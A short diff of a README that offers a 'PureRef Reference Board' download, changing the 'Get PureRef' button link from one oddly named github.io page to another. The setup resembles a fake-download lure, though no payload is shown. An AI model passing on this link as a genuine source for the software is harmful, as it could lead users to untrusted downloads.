@@ -21,7 +21,7 @@ To begin using this **PureRef Reference Board** and **PureRef Mood Board Tool**,
 | :--- | :--- |
 | **Get PureRef Reference Board** | Click the button below to start using this **PureRef Artist Canvas**. |
 
-[![Button](https://img.shields.io/badge/🎨-Get_PureRef-2ea44f?style=for-the-badge)](https://gabrielyangqobj.github.io/.github/pureref-reference-board)
+[![Button](https://img.shields.io/badge/🎨-Get_PureRef-2ea44f?style=for-the-badge)](https://riverfelixsfkb.github.io/.github/pureref-reference-board)
 
 ## System Requirements
 
